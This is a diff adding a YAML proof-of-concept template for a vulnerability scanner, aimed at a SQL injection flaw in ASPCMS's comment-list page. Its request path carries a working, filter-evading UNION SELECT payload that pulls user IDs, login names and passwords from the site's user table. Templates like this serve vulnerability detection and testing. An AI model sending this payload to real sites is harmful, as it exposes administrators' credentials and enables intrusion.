@@ -1,0 +1,16 @@
+name: poc-yaml-aspcms-id-sqli
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            method: GET
+            path: /plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20{prefix}user
+            follow_redirects: true
+        expression: response.status == 200 && response.body.bcontains(bytes((string("line1"))))&&response.body.bcontains(bytes((string("line2"))))
+expression: r0()
+detail:
+    author: xiao1hu
+    links:
+        - https://www.yuque.com/peiqiwiki/peiqi-poc-wiki/bg59x4
+    Affected Version: ASPCMS
